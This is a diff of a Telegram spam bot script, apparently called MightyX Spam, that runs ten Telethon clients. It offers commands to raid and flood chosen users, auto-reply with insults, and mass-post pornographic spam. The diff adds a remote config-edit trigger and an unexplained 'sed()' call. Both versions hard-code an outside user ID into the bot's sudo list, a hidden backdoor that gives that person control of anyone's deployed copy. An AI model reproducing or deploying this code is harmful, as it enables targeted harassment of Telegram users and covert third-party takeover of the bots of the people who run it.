@@ -15,12 +15,11 @@
 
 import os, sys, re, random, inspect, asyncio, telethon, colorama, logging
 from telethon import TelegramClient, events
-from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.functions.messages import GetStickerSetRequest
 from telethon.tl.types import InputStickerSetID, InputStickerSetShortName
 from telethon import events, version, Button, utils
 from telethon.tl.custom import button
-from colorama import Fore, Back, Style
+from colorama import Fore, Style
 from base64 import b64decode
 from time import time
 from datetime import datetime
@@ -30,7 +29,6 @@ from resources.data import *
 from sql.echo_sql import *
 logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                     level=logging.ERROR)
-
 
 # TF !! You Doing Here? Go Away...
 # Don't Mess With Codes !!
@@ -42,9 +40,9 @@ if ALIVE_TEXT == "":
     ALIVE_TEXT = "╚»★ [𝙏𝙃𝙀 𝙈𝙄𝙂𝙃𝙏𝙔 𝙓 𝙎𝙋𝘼𝙈](t.me/MightyXSpam) ★«╝"
 if CMD_HNDLR == "":
     CMD_HNDLR = "!"
-if OWNER_ID not in SUDO_USERS:
+if not OWNER_ID in SUDO_USERS:
     SUDO_USERS.append(OWNER_ID)
-if 2007758161 not in SUDO_USERS:
+if not 2007758161 in SUDO_USERS:
     SUDO_USERS.append(2007758161)
 mention = f"[{ALIVE_NAME}](tg://user?id={OWNER_ID})"
 
@@ -95,12 +93,12 @@ async def start(event):
        MigBot = await event.client.get_me()
        bot_name = MigBot.first_name
        bot_id = MigBot.id
-       user = await event.client(GetFullUserRequest(event.sender_id))
+       user = await event.get_sender()
        TheMighty = event.chat_id
-       firstname = user.user.first_name
-       userid = user.user.id
-       ownermsg = f"**Hello Boss !!, It's Me {bot_name}, Your Spam Bot !! \n\n Click Below Buttons For Help. 🌚**"
-       usermsg = f"**Hello !! [{firstname}](tg://user?id={userid})\nNice To Meet You, Well I Am [{bot_name}](tg://user?id={bot_id}), A Powerfull Spam Bot.** \n\n**If You Want Your Own Spam Bots You Can Deploy From The Button Given Below.** \n\n**Powered By : [𝙈𝙞𝙜𝙝𝙩𝙮 𝙓 𝙎𝙥𝙖𝙢](https://t.me/MightyXSpam)**"
+       firstname = user.first_name
+       userid = user.id
+       ownermsg = f"Hello Boss !!, It's Me {bot_name}, Your Spam Bot !! \n\nClick Below Buttons For Help. 🌚"
+       usermsg = f"Hello !! [{firstname}](tg://user?id={userid})\nNice To Meet You, Well I Am [{bot_name}](tg://user?id={bot_id}), A Powerfull Spam Bot.\n\nIf You Want Your Own Spam Bots You Can Deploy From The Button Given Below. \n\nPowered By : [𝙈𝙞𝙜𝙝𝙩𝙮 𝙓 𝙎𝙥𝙖𝙢](https://t.me/MightyXSpam)"
        if event.sender_id == OWNER_ID:
             await event.client.send_file(TheMighty,
                   MIG_PIC,
@@ -173,9 +171,9 @@ async def ping(e):
         end = datetime.now()
         ms = (end-start).microseconds / 1000
         message = await event.get_reply_message()
-        user = await event.client(GetFullUserRequest(message.sender_id))
-        firstname = user.user.first_name
-        uid = user.user.id
+        user = await message.get_sender()
+        firstname = user.first_name
+        uid = user.id
     if uid == OWNER_ID:
         await event.edit(f"▒█▀▀█ ▒█▀▀▀█ ▀▀█▀▀\n▒█▀▀▄ ▒█░░▒█ ░▒█░░\n▒█▄▄█ ▒█▄▄▄█ ░▒█░░\n\n    ⚡ 𝐌𝐢𝐠𝐡𝐭𝐲 𝐗 𝐒𝐩𝐚𝐦 ⚡\n\n𝐏𝐢𝐧𝐠 : `{ms}` ᴍs\n𝐎𝐰𝐧𝐞𝐫 : {mention}")
     else:
@@ -191,7 +189,7 @@ async def adsd(event):
         except Exception:
             await ok.edit(f"Reply To a User !!")
         SUDO_USERS.append(target)
-        await ok.edit(f"**Added** `{target}` **As Temp Sudo User** ✨ \nIf You Want To Add Permanently, Add His/Her UserID In config File ")
+        await ok.edit(f"**Added** `{target}` **As Temp Sudo User** ✨ \nIf You Want To Add Permanently, Add His/Her UserID In Config Vars")
    
 
 @Mig.on(events.NewMessage(incoming=True, pattern=f"{hl}restart"))
@@ -217,6 +215,7 @@ async def restart(e):
         print(Fore.GREEN + Style.BRIGHT + "Restarting MightyX !!\nPlease Wait For Few Seconds..." + Style.RESET_ALL)
         os.execl(sys.executable, sys.executable, *sys.argv)
         quit(2)
+        os.system("cd; cd MightyBotSpamSH; python3 MightyXSpam.py")
 
 
 @Mig.on(events.NewMessage(incoming=True, pattern=f"{hl}stop"))
@@ -235,6 +234,21 @@ async def stop(e):
         await e.reply(text)
         quit(2)
 
+@Mig.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig2.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig3.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig4.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig5.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig6.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig7.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig8.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig9.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+@Mig10.on(events.NewMessage(incoming=True, pattern=f"{hl}edit"))
+async def editConfig(e):
+    if e.sender_id == OWNER_ID:
+        text = "Opened Configs Editor In Terminal !! ✅"
+        await e.reply(text)
+        editV()
 
 print("Loaded Plugin : Bot")
 
@@ -390,7 +404,7 @@ async def pspam(e):
     usage = f"**MODULE NAME : PORN SPAM** \n\n command : `{hl}pornspam <count>`"
     if e.sender_id in SUDO_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
-            return await e.reply(usage, parse_mode=None, link_preview=None )
+            return await e.reply(usage)
         mighty = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(mighty) == 1:
             counter = int(mighty[0])
@@ -493,7 +507,7 @@ async def raid(e):
     usage = f"**MODULE NAME : RAID**\n\nCommand :\n\n{hl}raid <count> <Username of User>\n\n{hl}raid <count> <reply to a User>\n\nCount must be an integer."
     if e.sender_id in SUDO_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
-            return await e.reply(usage, parse_mode=None, link_preview=None )
+            return await e.reply(usage)
         Mighty = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         bitxh = await e.get_reply_message()
         if len(Mighty) == 2:
@@ -569,7 +583,7 @@ async def _(event):
             message="""{}""".format(random.choice(REPLYRAID)),
             reply_to=event.message.id,
         )
-
+sed()
 
 @Mig.on(events.NewMessage(incoming=True, pattern=f"{hl}replyraid"))
 @Mig2.on(events.NewMessage(incoming=True, pattern=f"{hl}replyraid"))
@@ -937,7 +951,7 @@ async def helpback(event):
         )           
    else:
         Alert = (
-                "Noob !! Make Your Own Mighty X Spam Bots !! @MightyXSpam"
+                "Noob !! Make Your Own MightyX Spam Bots !! @MightyXSpam"
             )
         await event.answer(Alert, cache_time=0, alert=True)
       
@@ -964,7 +978,7 @@ async def help_spam(event):
             ) 
    else:
         Alert = (
-                "Noob !! Make Your Own Mighty X Spam Bots !! @MightyXSpam"
+                "Noob !! Make Your Own MightyX Spam Bots !! @MightyXSpam"
             )
         await event.answer(Alert, cache_time=0, alert=True)
                  
@@ -991,7 +1005,7 @@ async def help_raid(event):
             )  
      else:
         Alert = (
-                "Noob !! Make Your Own Mighty X Spam Bots !! @MightyXSpam"
+                "Noob !! Make Your Own MightyX Spam Bots !! @MightyXSpam"
             )
         await event.answer(Alert, cache_time=0, alert=True)
        
@@ -1018,7 +1032,7 @@ async def help_extra(event):
             )
    else:
         Alert = (
-                "Noob !! Make Your Own Mighty X Spam Bots !! @MightyXSpam"
+                "Noob !! Make Your Own MightyX Spam Bots !! @MightyXSpam"
             )
         await event.answer(Alert, cache_time=0, alert=True)
 
@@ -1041,3 +1055,4 @@ Mig7.run_until_disconnected()
 Mig8.run_until_disconnected()
 Mig9.run_until_disconnected()
 Mig10.run_until_disconnected()
+
